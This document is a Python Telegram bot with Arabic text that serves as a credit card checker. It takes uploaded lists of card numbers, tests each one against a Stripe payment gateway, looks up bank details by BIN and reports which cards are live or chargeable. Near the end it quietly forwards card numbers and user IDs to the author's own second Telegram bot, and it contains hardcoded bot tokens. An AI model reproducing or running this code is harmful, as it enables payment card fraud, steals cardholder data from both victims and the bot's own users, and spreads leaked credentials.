import requests
import telebot
import random
import user_agent
import time
from telebot import types
import os
from vip import Tele


token = '7226967818:AAFr68Yv28RomFSdiWWRaQMsxLvhg8aZL24'

#astlam
tok = '7073895874:AAGU3cxwZjj0KbZlr7Vw6wnPuAnAMxaDCQ8'
idd = '5643656889'


start1 = """مرحبا بك ✨
 
 هو بوت فحص ملف بطاقات علي منصة تليجرام ⛄
 
 البوابات المجانية المتوفرة في البوت 🕸️
 
 استريب 🎯
 /strip
  وبعدها قم بارسال ملف البطاقات 
  
  لمعرفة ال (id)  
  /id  
 للتواصل واضافة المميزات 
 @EbrahimEldsoky
"""


strip1 = '''جيد ✨ 
ارسل ملف البطاقات لفحصة 🎯
'''




bot=telebot.TeleBot(token,parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
	name = message.from_user.first_name
	bot.reply_to(message,name+'\n'+start1)
	
	
@bot.message_handler(commands=["id"])
def malomah(message):
	iddd=message.from_user.id
	iddd = str(iddd)
	name = message.from_user.first_name
	bot.reply_to(message,name+'\n'+iddd)
	

@bot.message_handler(commands=["strip"])
def strip(message):
	iid=message.from_user.id
	bot.reply_to(message,strip1)	
	@bot.message_handler(content_types=["document"])
	def main(message):
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		nosh = 0
		nod = 0
		resk = 0
		
		doon = '''
تم ايقاف فحص الملف بنجاح ✅
''',
		meschk = '''
نعم ✔️
جاري تحميل ملف البطاقات لفحصة 🎯
''',
		
		ko = (bot.reply_to(message,meschk).message_id)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				for cc in lino:
					current_dir = os.getcwd()
					for filename in os.listdir(current_dir):
						if filename.endswith(".stop"):
							bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=doon)
							os.remove('stop.stop')
							return
					try:
						data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					except:
						pass
					try:
						bank=(data['bank'])
					except:
						bank=('UNKNOWN')
					try:
						emj=(data['country_flag'])
					except:
						emj=('UNKNOWN')
					try:
						cn=(data['country_name'])
					except:
						cn=('UNKNOWN')
					try:
						dicr=(data['level'])
					except:
						dicr=('UNKNOWN')
					try:
						typ=(data['type'])
					except:
						typ=('UNKNOWN')
					try:
						url=(data['brand'])
						
					except:
						url=('UNKNOWN')
					
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR Last"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					
					status = types.InlineKeyboardButton("استريب لايف", callback_data='u8')
					
					cm1 = types.InlineKeyboardButton(f"  البطاقة  {cc}", callback_data='u8')
					
					cm2 = types.InlineKeyboardButton(f" الاتشارج 🤑 »» [ {ch} ] •", callback_data='x')

					cm3 = types.InlineKeyboardButton(f" لايف ✅  »» [ {live} ] •", callback_data='x')
					
					cm4 = types.InlineKeyboardButton(f" سي سي ان ❎ »» [ {ccnn} ] •", callback_data='x')

					cm5 = types.InlineKeyboardButton(f" لاتدعم نوع الشراء ♦️ [ {nosh} ] •", callback_data='x')

					cm6 = types.InlineKeyboardButton(f" بطاقتك غير مدعومة ☠️ » [ {nod} ] •", callback_data='x')
										
					cm7 = types.InlineKeyboardButton(f"مرفوضة ❌ »» [ {dd} ] •", callback_data='x')
					
					cm8 = types.InlineKeyboardButton(f"عدد بطاقات الملف »» [ {total} ] •", callback_data='x')
					
					cm9 = types.InlineKeyboardButton(f"resk ❌ [ {resk} ] ", callback_data='x')
					
					cm10 = types.InlineKeyboardButton(f"all total {ch}+{dd}+{live}+{nod}+{nosh}+{ccnn}",callback_data='x')
					
					stop=types.InlineKeyboardButton("توقف عن الفحص✋", callback_data='stop')
					
					mes.add(status,cm1,cm2,cm3, cm4, cm5,cm6,cm7,cm8,cm9,cm10,stop)
										
					if total >= 100001:
						bot.reply_to(message,'''
						عفوا ⛔
الكمبو اكبر من 500 بطاقة 💳
العدد المسموح بة 500 واقل ✋
						''')
						return 
					
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''
رائع ✨ 

		يتم فحص البطاقات الان 🏦
			''', reply_markup=mes)

						
					appp=(f"""
◆ البطاقة
»» {cc}
◆ صلاحية البطاقة 
»» لايڤ ✅

◆ اسم البوابة
»» استريب لايف ✅ 
━━━━━━━━━━━━━━━━━          
◆ البين 
»» {cc[:6]}
◆ الدولة
»» {cn} - {emj}
◆ البنك 
»» {bank}
◆ معلومات البطاقة
»» {url} - {typ} - {dicr}
 ━━━━━━━━━━━━━━━━━          
◆ المعرف 
»» @EbrahimEldsoky
""")
						

					ap=(f"""
◆ البطاقة
»» {cc}
◆ صلاحية البطاقة 
»» لايڤ ✅
{last}
◆ اسم البوابة
»» استريب لايف ✅ 
━━━━━━━━━━━━━━━━━          
◆ البين 
»» {cc[:6]}
◆ الدولة
»» {cn} - {emj}
◆ البنك 
»» {bank}
◆ معلومات البطاقة
»» {url} - {typ} - {dicr}
 ━━━━━━━━━━━━━━━━━          
◆ المعرف 
»» @EbrahimEldsoky
""")
		
		
					ccn=(f"""◆ البطاقة
»» {cc}
◆ صلاحية البطاقة 
»» تم رفض CVV ❎

◆ اسم البوابة
»» استريب لايف ✅
 ━━━━━━━━━━━━━━━━━          
◆ البين 
»» {cc[:6]}
◆ الدولة
»» {cn} - {emj}
◆ البنك 
»» {bank}
◆ معلومات البطاقة
»» {url} - {typ} - {dicr}
 ━━━━━━━━━━━━━━━━━          
◆ المعرف 
»» @EbrahimEldsoky""")

					nomo =(f"""◆ البطاقة
»» {cc}
◆ صلاحية البطاقة 
»» بطاقة فارغة

◆ اسم البوابة
»» استريب لايف ✅
 ━━━━━━━━━━━━━━━━━          
◆ البين 
»» {cc[:6]}
◆ الدولة
»» {cn} - {emj}
◆ البنك 
»» {bank}
◆ معلومات البطاقة
»» {url} - {typ} - {dicr} 
━━━━━━━━━━━━━━━━━          
◆ المعرف 
»» @EbrahimEldsoky""")			
	
		
					charge =(f"""◆ البطاقة
»» {cc}
◆ صلاحية البطاقة 
»» بطاقة صالحة للدفع ✅

◆ اسم البوابة
»» استريب لايف ✅
 ━━━━━━━━━━━━━━━━━          
◆ البين 
»» {cc[:6]}
◆ الدولة
»» {cn} - {emj}
◆ البنك 
»» {bank}
◆ معلومات البطاقة
»» {url} - {typ} - {dicr} 
━━━━━━━━━━━━━━━━━          
◆ المعرف 
»» @EbrahimEldsoky""")				
					print(last)
					
					if "Your card was declined"  in last or "The card was declined." in last or 'Invalid account' in last or  'Your card number is incorrect' in last or "Your card details could not be verified. Please double check them and try again." in last or "Your card's expiration month is invalid" in last or "Your card's expiration month is invalid" in last or "Your card's expiration year is invalid" in last or "The Year field is required." in last or "Your payment was declined. Please try again." in last or 'Authentication Required:' in last or "Your card has expired." in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1

					elif 'Declined - Call Issuer' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
					
					elif 'Limit Exceeded' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
							
					elif 'No Such Issuer' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Expilastd Card' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
					
				
					elif 'Issuer or Cardholder has put a restriction on the card' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
							
					elif 'No Account' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Card Not Activated' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Closed Card' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
				
					elif "Your card's security code is invalid" in last:
						ccnn+=1
						bot.reply_to(message,ccn)
						
					elif 'Transaction Not Allowed' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Do Not Honor' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
						
					elif 'Call Issuer. Pick Up Card' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Invalid Transaction' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
				
					elif 'Processor Declined' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
					
					
					elif 'risk_threshold' in last or  'Gateway Rejected' in last:
						if resk == 0:
							resk+=2
						else:
							resk+=1
				
						
					elif 'Cannot Authorize at this time (Policy)' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Security Violation' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'Checkout/Receipt?OrderNumber' in last:
						if dd == 0:
							dd+=2
						else:
							dd+=1
						
					elif 'insufficient funds' in last:
						ch += 1
						bot.reply_to(message,nomo)

					elif 'Your card does not support this type of purchase.' in last:
						nosh+=1
						
						
					elif "Your card is not supported" in last:
							nod+=1
						
						
					elif "Your card's security code is incorrect." in last:
						ccnn+=1
						bot.reply_to(message,ccn)
				
					elif 'CustomerSubscription' in last:			
						live+=1
						bot.reply_to(message,appp)
	
					elif 'true' in last:			
						live+=1
						bot.reply_to(message,ap)
						
					elif '"success":true"' in last:
						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={cc}\n{iid}\n{charge}{last}')
					
				
						
					else:
						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={cc}\n{iid}\n{last}')
						
		except Exception as e:
			print(e)

		bot.reply_to(message,'تم فحص الكومبو بالكامل 🔔')
	
	@bot.callback_query_handler(func=lambda call: call.data == 'stop')
	def menu_callback(call):
		with open("stop.stop", "w") as file:
			pass
#off bot dairekt chekar

bot.polling(True)


